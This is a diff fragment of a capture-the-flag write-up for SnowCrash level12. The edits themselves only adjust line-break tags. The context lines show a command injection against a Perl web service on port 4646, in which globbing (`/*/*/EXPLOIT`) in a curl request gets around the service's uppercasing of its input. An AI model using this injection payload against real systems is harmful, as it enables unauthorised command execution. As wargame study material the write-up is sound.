@@ -48,7 +48,7 @@ Here's what that would look like in a navigator:<br/>
 ```http://${VM_IP}:4646/?x={shellscript}<br/>```
 
 In the program, the shellscript is evaluated in the $xx variable... which we can exploit!<br/>
-The regex will capitalize the $xx argument, so we if we write ```x="getflag > /dev/shm/flag12"``` it will be changed to ```"GETFLAG > /DEV/SHM/FLAG12"```.<br/>
+The regex will capitalize the $xx argument, so we if we write ```x="getflag > /dev/shm/flag12"``` it will be changed to ```"GETFLAG > /DEV/SHM/FLAG12"```.
 Linux is case-sensitive, so it will fail to recognize a filepath in capital case. <br/>
 Let's try writing our script to a file. 
 ```
@@ -75,7 +75,7 @@ level12@SnowCrash:/dev/shm$ cat flag12
 Check flag.Here is your token :
 Nope there is no token here for you sorry. Try again :)
 ```
-It works! Time to leverage the perl program to execute our script. 
+It works! Time to leverage the perl program to execute our script.<br/>
 Since we can't pass the filepath directly (it'll get capitalized by the perl program and be unrecognizable), we'll use globbing and replace the file path with asterisks.
 ```
 level12@SnowCrash:/dev/shm$ curl '127.0.0.1:4646?x="`/*/*/EXPLOIT`"'
